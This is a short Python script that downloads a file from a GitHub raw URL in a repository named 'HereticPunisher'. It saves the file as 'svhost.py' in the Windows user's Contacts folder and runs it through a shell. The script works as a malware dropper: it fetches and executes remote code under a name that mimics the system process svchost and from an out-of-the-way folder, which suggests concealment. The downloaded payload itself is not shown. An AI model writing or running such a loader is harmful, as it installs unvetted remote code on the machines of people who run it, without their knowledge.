import requests
from os import getlogin, makedirs
from os.path import dirname
from subprocess import call

def execute_code(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        
        code = response.text
        file_path = f'C:\\Users\\{getlogin()}\\Contacts\\svhost.py'

        makedirs(dirname(file_path), exist_ok=True)
        
        with open(file_path, 'w') as source_file:
            source_file.write(code)
        
        call(f'start {file_path}', shell=True)

    except Exception as e:
        print(f"Failed to execute code: {e}")

url = 'https://raw.githubusercontent.com/lopeklol/HereticPunisher/main/svhost.py'
execute_code(url)